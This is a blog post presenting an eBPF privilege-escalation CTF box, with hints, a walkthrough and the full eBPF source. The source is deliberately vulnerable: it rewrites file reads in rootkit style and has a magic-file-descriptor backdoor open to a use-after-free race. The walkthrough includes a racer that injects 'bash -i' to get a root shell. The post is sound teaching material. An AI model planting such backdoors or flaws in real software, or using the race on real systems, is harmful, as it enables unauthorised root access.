---
layout: post
title:  "Vulnerable eBPF CTF Challenge 01"
date:   2024-09-05 15:00:00 -0400
categories: linux
tags: [linux, ebpf, security, ctf]
---

A CTF style vulnerable box where you need to find and exploit a mistake in an
eBPF program that allows privilege escalation to root.

**VBox Link:** [ds-process-station.ova](https://drive.proton.me/urls/N5N706873W#iukNoMtDY6oK) (681 MB)  
**Qemu Link:** TODO :D

## README.md

Download the `.ova` and import the appliance into Virtualbox. Start the machine
and log in directly from the virtual console.

Username: `datascience`  
Password: `password`

Your goal is to read `/root/flag.txt` by exploiting a vulnerability in the eBPF
programs and other utilities in the `~/process-utils` folder.

Scroll down for the walkthrough (spoilers!).

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />


## Hints

The following are copies of all the hints available on the box, if you'd prefer
to try to solve it yourself. You can scroll past the things to get to the step
by step walkthrough.

### Hint 1

The `live-patch` binary installs an eBPF program that live patches the `task.sh`
script executed by the `task-exec` binary.

### Hint 2

You can check loaded eBPF programs with `bpftool prog list`.

### Hint 3

You can inspect the contents of running eBPF programs with `bpftool prog dump
xlated id <number of program>`.

### Hint 4

How are patches to `task.sh` tracked? In what map?

### Hint 5

What is the difference between `BPF_ANY` and `BPF_NOEXIST` when calling
`bpf_map_update_elem`?

### Hint 6

What is the difference between `BPF_MAP_TYPE_LRU_PERCPU_HASH` and
`BPF_MAP_TYPE_LRU_HASH`?

### Hint 7

What happens when an element is deleted from an eBPF map but a reference to that
memory address is kept and used?

## Walkthrough

I am going to assume you have imported the appliance into virtualbox or ported
it to your hypervisor of choice, and have logged in as the `datascience` user
with the password `password`.  After logging in to the box you will see a
`README.md` file. The contents of that file are as follows.

```
# Tips & Hints

The goal is to use the files you find under ~/process-utils to escalate to root
and read /root/flag.txt. You will do this by exploiting a vulnerability in the
BPF programs contained by `live-patch`.

You can probably read the flag another way, but that's no fun.

You might be able to game the solution without understanding why it worked. Try
to understand why it works.

Everything you need is already on this box. You should not need to install,
transfer, or update anything.

You will not need to modify the files on disk in the ~/process-utils directory.

You can run multiple programs at one time with tmux or screen.
```

### Exploration & process-utils folder

Besides the readme and hints, we can see a `process-utils` folder in the user's
home directory. Since we are working with eBPF, we likely have `bpftool` on this
system. It's not in the path, but it is available under `/sbin/bpftool`. For the
purposes of this challenge, I set the SUID bit so we can run it as a regular
user.

> Note: The purpose of including `bpftool` was to make dumping eBPF bytecode
> easier. I will be demonstrating a solution that does not require `bpftool`.
> However, `bpftool` is very powerful and can definitely be used to complete this
> challenge. This is left as an exercise to the reader.

```
datascience@etl:~$ ls -l process-utils/
total 1476
-rwsr-xr-x 1 root root 1490576 Sep 12 12:47 live-patch
-rwsr-xr-x 1 root root   16384 Sep  5 14:05 task-exec
-rw-r--r-- 1 root root     216 Sep 12 12:36 task.sh
datascience@etl:~$ ls -l /sbin/bpftool
-rwsr-xr-x 1 root root 544776 Aug 26 15:47 bpftool
```

We can see the `live-patch` and `task-exec` binaries both have their SUID bits
set, so we can run them with root privileges. The `task.sh` script is not
runnable directly or modifiable.

Let's see what `task.sh` does.

```
datascience@etl:~/process-utils$ cat task.sh
#!/bin/bash

set -Eeuxo pipefail

echo "Please run the live patcher to ensure you execute the latest version of the script."

ls -latr /home/*
ls -latr /root/*

# TODO: copy and format data from root user to DS user
```

If we run `task.sh` with `bash task.sh`, we'll see it lists out our home folder,
attempts to list the root folder and gets an access denied, and prints the
following message.

```
Please run the live patcher to ensure you execute the latest version of the script.
```

If we run the SUID binary `task-exec`, we can see the same warning, except this
time the contents of `/root` are successfully displayed.

```
+ ls -latr /root/flag.txt
-rw-r--r-- 1 root root 53 Sep  5 14:56 /root/flag.txt
```

So we can assume `task-exec` runs `task.sh` with root privileges.

### Running the Live Patcher

We can now try running the `live-patch` binary.

```
datascience@etl:~process-utils$ ./live-patch
Task patcher is now running!
..^C
```

From the message, we can assume this applies some kind of live patching to the
task program, or script, or both.

> (N.B., the live patcher looks for programs opening any file named `task.sh`
> and replaces the contents when you attempt to `read()` the file, without
> modifying the file on disk, just some rootkit type stuff)

Let's run this in the background...

```
datascience@etl:~process-utils$ tmux new -s lp
datascience@etl:~process-utils$ ./live-patch
Task patcher is now running!
...
```

`Ctrl+B, d` to drop it to the background and we can check what's happening with
`task.sh`.

```
datascience@etl:~process-utils$ cat task.sh
#!/bin/bash
echo 'Patch script not set.'
exit 0
her to ensure you execute the latest version of the script."

ls -latr /home/*
ls -latr /root/*

# TODO: copy and format data from root user to DS user
```

The beginning of the script has been replaced with a message that reads "Patch
script not set." If we try to run `task-exec` now we can see it dumps out these
modified contents and exits without doing anything.

### Perusing the eBPF Bytecode

But what is the `live-patch` program actually doing? We can check that with
`bpftool`! If you run `/sbin/bpftool prog list` you should see something like
the following.

```
97: kprobe  name entry_do_filp_o  tag 7bc6868cc23d6e95  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 1112B  jited 660B  memlock 4096B  map_ids 22,25,24,27
        btf_id 118
99: kprobe  name exit_do_filp_op  tag de0dad17356df798  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 112B  jited 74B  memlock 4096B  map_ids 22,27
        btf_id 118
100: kprobe  name entry_vfs_read  tag 054da101587b33d9  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 184B  jited 116B  memlock 4096B  map_ids 22,23,27
        btf_id 118
101: kprobe  name exit_vfs_read  tag 2dccbd892dbb8cb9  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 2232B  jited 1269B  memlock 4096B  map_ids 24,23,27
        btf_id 118
102: kprobe  name entry_read  tag 131f759aba032ef9  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 224B  jited 133B  memlock 4096B  map_ids 28,27
        btf_id 118
103: kprobe  name exit_read  tag a04f5eef06a7f555  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 16B  jited 16B  memlock 4096B  map_ids 27
        btf_id 118
104: kprobe  name enter_write  tag bd18dd76ddc1c645  gpl
        loaded_at 2024-09-12T18:09:36+0000  uid 0
        xlated 544B  jited 288B  memlock 4096B  map_ids 28,24,27
        btf_id 118
```

From the names of the loaded kprobes we can assume that something is happening
with file opens (`entry_do_filp_o` an `exit_do_filp_op`), reads
(`entry_vfs_read`, `exit_vfs_read`, `entry_read`, and `exit_read`), and writes
(`enter_write`). From the `map_ids` of each program we can see that the file
open kprobes share a unique map id 22 with the `entry_vfs_read` kprobe, so we
can assume they are preparing and sharing some data with a read entry probe
(open must happen before read). We can also see that the entry and exit
`vfs_read` kprobes share a unique map id 23, so we can assume the entry probe is
preparing some data to be used by the exit probe (kprobes fire before
kretprobes). Finally, we see the `enter_write` kprobe shares a unique map id 24
with the file open entry probe and the `vfs_read` exit probe, so there is
probably some data being collected during one of those calls that's relevant to
the others.

> (N.B., the `entry_read` and `exit_read` probes are red herrings, so I'm just
> going to ignore them)

### Finding the Vulnerability

With the power of I-wrote-this-challenge-so-I-know-where-to-look, let's start by
dumping the contents of `enter_write`. You will probably want to pipe the output
to `less` so it's easier to scroll through. There's a good bit of output, so I'm
going to cut it to just the relevant parts.

```
datascience@etl:~$ /sbin/bpftool prog dump xlated id 104
int enter_write(struct pt_regs * ctx):
; int BPF_KSYSCALL(enter_write, int fd, const void *buf, size_t count) {

// a bunch of stuff here to read function call args and save into variables

; if (fd == 0xDEADBEE) {
  29: (55) if r8 != 0xdeadbee goto pc+36
  30: (79) r2 = *(u64 *)(r10 -80)
  31: (b7) r1 = 0
; u64 idx = 0;
  32: (7b) *(u64 *)(r10 -8) = r1
; struct task_detail td = {

// a bunch of stuff setting up an empty struct

; int ret = bpf_probe_read(&td.str, count, buf);

// a bunch of error checking stuff for the probe read

;
  59: (07) r2 += -8
  60: (bf) r3 = r10
  61: (07) r3 += -80
  62: (18) r1 = map[id:24]
  64: (b7) r4 = 1
  65: (85) call htab_lru_map_update_elem#192480
; int BPF_KSYSCALL(enter_write, int fd, const void *buf, size_t count) {
  66: (b7) r0 = 0
  67: (95) exit
```

eBPF call arguments are stored in order in `r1`, `r2`, `r3`, and so on. From the
dumped code we can see:

1) the kprobe checks if the file descriptor passed to `write()` is `0xDEADBEE`
2) if it is, we start preparing a `task_detail` struct and copy the contents of `buf` into it
3) we then store this `task_detail` struct in a map with id 24 by calling `htab_lru_map_update_elem` with `r1` being the map id 24, `r2` being a pointer to an empty index value, `r3` being a pointer to the `task_detail`, and `r4 = 1` being the flag `BPF_NOEXIST`

This means we can store any string in this hashtable map by calling `write` with
the special file descriptor `0xDEADBEE` if a string is not already stored in the
map.

> (N.B., yes this is a lazy backdoor, you could also use bpftool to write to the
> map, I couldn't contrive a reasonable way to update the map without a ton of
> effort so we got a super special secret file descriptor value)

Where is this relevant? We know that map id 24 was also used in `exit_vfs_read`
and `entry_do_filp_o`. Let's look at the relevant sections from those programs
by dumping their contents and searching for references to `map[id:24]`.


```
// entry_do_filp_open
; bpf_map_update_elem(&task_detail, &id, td, BPF_ANY);
 132: (18) r1 = map[id:24]
 134: (bf) r3 = r0
 135: (b7) r4 = 0
 136: (85) call htab_lru_map_update_elem#192480
```

We can see the file open probe only updates the contents of the map. Crucially,
`r4 = 0` is the flag `BPF_ANY`, which means this map will be updated when a file
is opened regardless of what contents the map already holds. This is where the
"Patch script not set." message is likely saved.

```
// exit_vfs_read
; struct task_detail *td = bpf_map_lookup_elem(&task_detail, &idx);
   9: (18) r1 = map[id:24]
  11: (85) call __htab_map_lookup_elem#183728
  12: (15) if r0 == 0x0 goto pc+4
  13: (71) r1 = *(u8 *)(r0 +35)
  14: (55) if r1 != 0x0 goto pc+1
  15: (72) *(u8 *)(r0 +35) = 1
  16: (07) r0 += 56
  17: (bf) r6 = r0
; if (td == NULL) {
  18: (15) if r6 == 0x0 goto pc+258
  19: (bf) r2 = r10
;
  20: (07) r2 += -16
; bpf_map_delete_elem(&task_detail, &idx);
  21: (18) r1 = map[id:24]
  23: (85) call htab_lru_map_delete_elem#192112
```

We can see that `exit_vfs_read` actually looks up the struct stored in this map
and, after some verifier-pleasing null checks, deletes the contents of the map.
Later on, we can see the contents of this struct being copied onto the stack,
and then into the userspace buffer provided to the read call.

```
; long write_ret = bpf_probe_write_user(buf, stack_string, STR_MAX);
 274: (79) r1 = *(u64 *)(r10 -152)
 275: (b7) r3 = 64
 276: (85) call bpf_probe_write_user#-69312
```

But how is that possible if the contents of the map have been deleted? Well, it
turns out they're not. Let's look at [the kernel source for
`htab_lru_map_delete_elem`](https://elixir.bootlin.com/linux/v6.1.110/source/kernel/bpf/hashtab.c#L1416).

```c
static int htab_lru_map_delete_elem(struct bpf_map *map, void *key)
{
	struct bpf_htab *htab = container_of(map, struct bpf_htab, map);
	struct hlist_nulls_head *head;
	struct bucket *b;
	struct htab_elem *l;
	unsigned long flags;
	u32 hash, key_size;
	int ret;

	WARN_ON_ONCE(!rcu_read_lock_held() && !rcu_read_lock_trace_held() &&
		     !rcu_read_lock_bh_held());

	key_size = map->key_size;

	hash = htab_map_hash(key, key_size, htab->hashrnd);
	b = __select_bucket(htab, hash);
	head = &b->head;

	ret = htab_lock_bucket(htab, b, hash, &flags);
	if (ret)
		return ret;

	l = lookup_elem_raw(head, hash, key, key_size);

	if (l)
		hlist_nulls_del_rcu(&l->hash_node);
	else
		ret = -ENOENT;

	htab_unlock_bucket(htab, b, hash, flags);
	if (l)
		htab_lru_push_free(htab, l);
	return ret;
}
```

After grabbing a lock we check that the element exists and if so we delete the
hash node and free the memory. Go to the elixir page and click around, you'll
see at no point is the memory itself cleared out. Why would it be? Don't use
memory after freeing it. Get good, eBPF programmer.

Another crucial thing to notice is that this is an LRU hash map and not a
per-CPU LRU hash map. This means we can modify the values for all CPUs from any
CPU, instead of using a special per-CPU helper (which the loaded program does
not have).

> (N.B., if it were per-CPU you could just use bpftool instead, but the point is
> to find something in the BPF code itself you can use; because the write kprobe
> updates the map with BPF_NOEXIST we must wait until after the entry is freed but
> before it is used to modify it)

### Exploiting the Vulnerability

Since `task-exec` will run anything in `task.sh` (or that gets patched into
`task.sh`) as root, we just have to race the UAF and insert our own command.
Let's call it `solution.c` and run it in a new tmux window.

```c
void main() {
    char * or = "bash -i\n";
    for (;;) {
        write(0xDEADBEE, or, strlen(or));
    }
}
```

```
datascience@etl:~$ tmux new -s solution
datascience@etl:~$ cc solution.c
datascience@etl:~$ ./a.out
```

Then, from the `process-utils/` directory, we keep running `task-exec` until we
win the race and get a root shell.

```
datscience@etl:~$ while true; do ./task-exec; done

# a bunch of stuff happens here over and over

root@etl:~/process-utils# cat /root/flag.txt
flag{th3_ver1fier_do3snt_r3c0gn1ze_UAF_l0l_Us3_Rust}
```

## live-patch.bpf.c source code

For reference, the full eBPF source code.

```c
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <string.h>

#define STR_MAX 64

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct task_detail {
  u32 len;
  char str[STR_MAX];
};

struct {
  __uint(type, BPF_MAP_TYPE_LRU_PERCPU_HASH);
  __type(key, u64);
  __type(value, u64);
  __uint(max_entries, 512);
} file_map SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_LRU_PERCPU_HASH);
  __type(key, u64);
  __type(value, u64);
  __uint(max_entries, 512);
} buf_map SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_LRU_HASH);
  __type(key, u64);
  __type(value, struct task_detail);
  __uint(max_entries, 16);
} task_detail SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_ARRAY);
  __type(key, u32);
  __type(value, struct task_detail);
  __uint(max_entries, 1);

} td_scratch SEC(".maps");

static __always_inline int startswith(const char *s, const char *t, int len) {
  for (int i = 0; i < (len & 0xFF); i++) {
    if (s[i] != t[i]) {
      return -1;
    }
  }
  return 0;
}

static __always_inline int entry_open_common(const char *pathname) {
  u64 key = bpf_get_current_pid_tgid();
  u64 val = -1;
  char buf[64];

  int ret = bpf_probe_read_str(&buf, sizeof(buf), pathname);
  if (ret != 8) {
    return 0;
  }

  if (startswith(buf, "task.sh", 7) == 0) {
    bpf_map_update_elem(&file_map, &key, &val, BPF_ANY);
    u32 idx = 0;
    struct task_detail *td = bpf_map_lookup_elem(&td_scratch, &idx);
    if (td == NULL) {
      return 0;
    }
    __builtin_memcpy(
        td->str, "#!/bin/bash\necho 'Patch script not set.'\nexit 0\n\0", 49);
    td->len = 49;
    u64 id = 0;
    bpf_map_update_elem(&task_detail, &id, td, BPF_ANY);
  }

  return 0;
}

SEC("kprobe/do_filp_open")
int BPF_KPROBE(entry_do_filp_open, int dfd, struct filename *pathname,
               const struct open_flags *op) {
  const char *filename = BPF_CORE_READ(pathname, name);
  return entry_open_common(filename);
}

SEC("kretprobe/do_filp_open")
int BPF_KRETPROBE(exit_do_filp_open, u64 ret) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  int suc = bpf_map_update_elem(&file_map, &pid_tgid, &ret, BPF_EXIST);
  return 0;
}

// check if FD is the FD of task.sh and if so, check if we're meant to inject
// anything, and if so, save the userspace buffer for the kretprobe
SEC("kprobe/vfs_read")
int BPF_KPROBE(entry_vfs_read, struct file *file, char *buf, size_t count,
               loff_t *pos) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 *map_file = bpf_map_lookup_elem(&file_map, &pid_tgid);
  if (map_file != NULL && *map_file == (u64)file) {
    bpf_map_update_elem(&buf_map, &pid_tgid, &buf, BPF_NOEXIST);
  }

  return 0;
}

SEC("kretprobe/vfs_read")
int BPF_KRETPROBE(exit_vfs_read, ssize_t ret) {
  if (ret <= 0) {
    return 0;
  }

  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 idx = 0;
  struct task_detail *td = bpf_map_lookup_elem(&task_detail, &idx);
  if (td == NULL) {
    return 0;
  }
  bpf_map_delete_elem(&task_detail, &idx);

  void **user_buf = bpf_map_lookup_elem(&buf_map, &pid_tgid);
  if (user_buf == NULL) {
    return 0;
  }
  void *buf = *user_buf;

  if (td->len <= ret) {
    char stack_string[STR_MAX] = {0};
    __builtin_memcpy(stack_string, &td->str, STR_MAX);
    long write_ret = bpf_probe_write_user(buf, stack_string, STR_MAX);
  }

  return 0;
}

SEC("ksyscall/read")
int BPF_KSYSCALL(entry_read, int fd, void *buf, size_t count) {
  return 0;
}

SEC("kretprobe/__x64_sys_read")
int BPF_KRETPROBE(exit_read, long ret) {
  return 0;
}

// kprobe on write to check magic FD and copy buffer to scratch space for
// overwriting
SEC("ksyscall/write")
int BPF_KSYSCALL(enter_write, int fd, const void *buf, size_t count) {
  if (fd == 0xDEADBEE) {
    u64 idx = 0;
    struct task_detail td = {
        .len = count,
        .str = {0},
    };
    count &= 0b111111;
    int ret = bpf_probe_read(&td.str, count, buf);
    if (ret != 0) {
      return 0;
    }
    bpf_map_update_elem(&task_detail, &idx, &td, BPF_NOEXIST);
  }
  return 0;
}
```